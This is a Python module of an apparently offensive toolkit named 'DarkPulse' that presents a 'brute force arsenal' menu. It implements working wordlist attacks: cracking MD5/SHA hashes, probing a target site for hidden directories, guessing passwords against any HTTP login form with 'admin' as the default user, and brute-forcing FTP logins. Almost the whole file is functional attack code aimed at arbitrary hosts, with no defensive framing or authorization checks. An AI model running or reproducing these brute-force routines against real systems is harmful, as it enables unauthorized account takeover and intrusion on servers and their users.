import time, hashlib, os, ftplib
from core.config import *
from core.engine import *

def menu():
    while True:
        print(f"\n{R2}{B}  ╔══════════════════════════════════════════╗{E}")
        print(f"  {R2}║{E}  {R3}{B}🔓 BRUTE FORCE ARSENAL{E}                  {R2}║{E}")
        print(f"  {R2}╠══════════════════════════════════════════╣{E}")
        print(f"  {R2}║{E}  {G2}[1]{E} Hash Cracker (MD5/SHA1/SHA256)     {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[2]{E} Directory Bruteforcer              {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[3]{E} HTTP Login Bruteforcer             {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[4]{E} FTP Bruteforcer                    {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[5]{E} Generate Hash                      {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[0]{E} Back                               {R2}║{E}")
        print(f"  {R2}╚══════════════════════════════════════════╝{E}")
        c = input(f"\n  {R3}DarkPulse/BRUTE>{E} ").strip()
        if c == "0": break
        elif c == "1": hash_crack()
        elif c == "2": dir_brute()
        elif c == "3": http_brute()
        elif c == "4": ftp_brute()
        elif c == "5": gen_hash()

def _load_wordlist():
    path = input(f"  {GD}Wordlist path (Enter for built-in {len(PASSWORDS)} words):{E} ").strip()
    if not path:
        return PASSWORDS
    if os.path.exists(path):
        with open(path, "r", errors="ignore") as f:
            words = [l.strip() for l in f if l.strip()]
        print(f"  {G}[+] Loaded {len(words)} words{E}")
        return words
    print(f"  {R}[-] File not found, using built-in{E}")
    return PASSWORDS

def hash_crack():
    target = input(f"  {GD}Target Hash:{E} ").strip()
    if not target: return
    target = target.lower().strip()
    hlen = len(target)
    if hlen == 32: algo = "md5"
    elif hlen == 40: algo = "sha1"
    elif hlen == 64: algo = "sha256"
    elif hlen == 128: algo = "sha512"
    else:
        algo = input(f"  {GD}Hash type (md5/sha1/sha256/sha512):{E} ").strip().lower()
    print(f"  {G}[+] Detected: {algo.upper()}{E}")
    words = _load_wordlist()
    print(f"\n  {G2}[*] Cracking {algo} hash...{E}")
    t0 = time.time()
    count = 0
    for w in words:
        count += 1
        h = hashlib.new(algo, w.encode()).hexdigest()
        if h == target:
            elapsed = time.time() - t0
            print(f"\n  {R2}{B}  [!!!] CRACKED!{E}")
            print(f"  {R2}  Hash : {target}{E}")
            print(f"  {G2}  Plain: {R3}{B}{w}{E}")
            print(f"  {G}  Time : {elapsed:.3f}s | Tried: {count}{E}")
            return
        if count % 500 == 0:
            print(f"  {D}  ... {count} hashes tested{E}", end="\r")
    elapsed = time.time() - t0
    print(f"\n  {R}[-] Not cracked. Tried {count} words in {elapsed:.2f}s{E}")

def dir_brute():
    url = input(f"  {GD}Target URL (e.g. http://target.com):{E} ").strip()
    if not url: return
    url = url.rstrip("/")
    words = _load_wordlist() if input(f"  {GD}Use custom wordlist? (y/n):{E} ").strip().lower() == "y" else DIRS
    print(f"\n  {G2}[*] Bruteforcing {len(words)} paths on {url}...{E}")
    t0 = time.time()
    found = []
    for d in words:
        test_url = f"{url}/{d}"
        r = http_get(test_url, timeout=5)
        if r["code"] in [200, 301, 302, 403, 405]:
            color = G2 if r["code"] == 200 else (GD if r["code"] == 403 else D)
            print(f"  {color}[{r['code']}] {test_url}{E}")
            found.append((r["code"], test_url))
    elapsed = time.time() - t0
    print(f"\n  {GD}[+] {len(found)} interesting paths in {elapsed:.1f}s{E}")

def http_brute():
    url = input(f"  {GD}Login URL:{E} ").strip()
    if not url: return
    uname = input(f"  {GD}Username (Enter for 'admin'):{E} ").strip() or "admin"
    words = _load_wordlist()
    fail_str = input(f"  {GD}Failure string in response (e.g. 'Invalid'):{E} ").strip()
    print(f"\n  {G2}[*] Brute forcing {url} as '{uname}'...{E}")
    t0 = time.time()
    for pw in words:
        r = http_post(url, {"username": uname, "password": pw, "user": uname, "pass": pw, "login": "Login"}, timeout=5)
        if r["code"] == 0: continue
        if fail_str and fail_str.lower() not in r["body"].lower():
            print(f"\n  {R2}{B}  [!!!] LOGIN SUCCESS!{E}")
            print(f"  {G2}  User: {uname}{E}")
            print(f"  {R3}  Pass: {pw}{E}")
            print(f"  {G}  Time: {time.time()-t0:.1f}s{E}")
            return
        elif not fail_str and r["code"] in [301, 302]:
            print(f"\n  {R2}{B}  [!!!] POSSIBLE SUCCESS (redirect)!{E}")
            print(f"  {G2}  User: {uname} | Pass: {pw}{E}")
            return
        print(f"  {D}  ✗ {pw}{E}", end="\r")
    print(f"\n  {R}[-] Login not cracked{E}")

def ftp_brute():
    host = input(f"  {GD}FTP Host:{E} ").strip()
    if not host: return
    port = int(input(f"  {GD}Port (21):{E} ").strip() or "21")
    uname = input(f"  {GD}Username (Enter for 'admin'):{E} ").strip() or "admin"
    words = _load_wordlist()
    print(f"\n  {G2}[*] FTP Brute {host}:{port} as '{uname}'...{E}")
    t0 = time.time()
    for pw in words:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(uname, pw)
            print(f"\n  {R2}{B}  [!!!] FTP LOGIN SUCCESS!{E}")
            print(f"  {G2}  User: {uname}{E}")
            print(f"  {R3}  Pass: {pw}{E}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"  {D}  ✗ {pw}{E}", end="\r")
        except Exception as e:
            print(f"\n  {R}[-] Error: {e}{E}"); return
    print(f"\n  {R}[-] FTP login not cracked{E}")

def gen_hash():
    text = input(f"  {GD}Text to hash:{E} ").strip()
    if not text: return
    print(f"\n  {GD}  MD5   : {hashlib.md5(text.encode()).hexdigest()}{E}")
    print(f"  {GD}  SHA1  : {hashlib.sha1(text.encode()).hexdigest()}{E}")
    print(f"  {GD}  SHA256: {hashlib.sha256(text.encode()).hexdigest()}{E}")
    print(f"  {GD}  SHA512: {hashlib.sha512(text.encode()).hexdigest()}{E}")
